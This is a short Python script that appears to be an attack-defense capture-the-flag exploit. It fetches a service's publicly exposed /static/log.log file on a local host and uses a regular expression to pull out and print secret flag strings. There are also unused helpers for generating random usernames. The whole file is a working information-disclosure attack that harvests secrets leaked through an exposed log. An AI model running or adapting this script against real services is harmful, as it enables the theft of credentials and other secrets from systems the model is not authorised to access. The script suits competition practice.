#!/usr/bin/env python3

import sys
import requests
import hashlib
import re
from random import choice


alph_full = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
alph_caps = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
names = ['goliath', 'royal', 'dacota', 'marry', 'hunter', 'twilight' ,'smile' ,'castle', 'lucky', 'wolf']
FlagRegExp = re.compile(r'[A-Za-z0-9]{31}=')

#ip = sys.argv[1]
ip = '127.0.0.1'
port = '5000'
host = f'{ip}:{port}'


def id_gen( size = 10, first = names, next = alph_full ):
	beg = choice(first)
	return  beg + ''.join(choice(next) for i in range(size - len(beg)))


def main():

	flags = ""

	for flag in static():
		flags += flag + '\n'

	print( flags, flush=True )


def static() -> list:
	#http://127.0.0.1:5000/static/log.log
	data = requests.get(f'http://{host}/static/log.log').text#, data = {'login':u_name, 'password':passwd})
	return FlagRegExp.findall( data )


if __name__ == '__main__':
	main()